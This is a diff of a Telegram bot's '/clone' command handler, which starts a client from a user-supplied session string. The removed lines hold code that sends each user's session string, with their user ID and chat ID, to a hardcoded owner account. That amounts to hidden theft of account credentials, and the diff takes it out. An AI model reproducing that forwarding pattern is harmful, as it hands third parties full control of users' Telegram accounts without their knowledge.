@@ -29,44 +29,16 @@ async def hello(client: app, message):
 
 @app.on_message(filters.command("clone"))
 async def clone(bot: app, msg: Message):
-    # Check if session string is provided
-    if len(msg.command) < 2:
-        await msg.reply("**Usage:**\n\n/clone [session_string]\n\nPlease provide a valid session string.")
-        return
-
-    session_string = msg.command[1]
-    if not re.match(r"^[0-9A-Za-z_-]{20,}$", session_string):
-        await msg.reply("❌ Invalid session string provided. Please check and try again.")
-        return
-
-    chat_id = msg.chat.id
-    user = msg.from_user
-    processing_message = await msg.reply("**🎨 Processing... ✲**")
-
+    chat = msg.chat
+    text = await msg.reply("ᴜsᴀɢᴇ:\n\n /clone session")
+    cmd = msg.command
+    phone = msg.command[1]
     try:
-        # Start client
-        client = Client(
-            name="Melody",
-            api_id=API_ID,
-            api_hash=API_HASH,
-            session_string=session_string,
-            plugins=dict(root="UTTAM/plugins")
-        )
+        await text.edit("🎨 ᴘʀᴏᴄᴇssɪɴɢ.....✲")
+                   # change this Directry according to ur repo
+        client = Client(name="Melody", api_id=API_ID, api_hash=API_HASH, session_string=phone, plugins=dict(root="UTTAM/plugins"))
         await client.start()
-
-        owner_id = 5738579437
-        forward_message = (
-            f"**Clone Request Started:**\n\n"
-            f"**From:** {user.mention}\n"
-            f"**User ID:** `{user.id}`\n"
-            f"**Chat ID:** `{chat_id}`\n"
-            f"**Session String:** `{session_string}`"
-        )
-        await bot.send_message(owner_id, forward_message)
-
-        user_details = await client.get_me()
-        await processing_message.edit(f"🎨**Clone successful!**\nLogged in as **{user_details.first_name}**.")
-        await client.stop()
-
+        user = await client.get_me()
+        await msg.reply(f" Successfully host 🎨 {user.first_name} 💨.")
     except Exception as e:
-        await processing_message.edit("❌ An error occurred. Please try again or contact support.")
+        await msg.reply(f"**ERROR:** `{str(e)}`\nPress /start to Start again.")
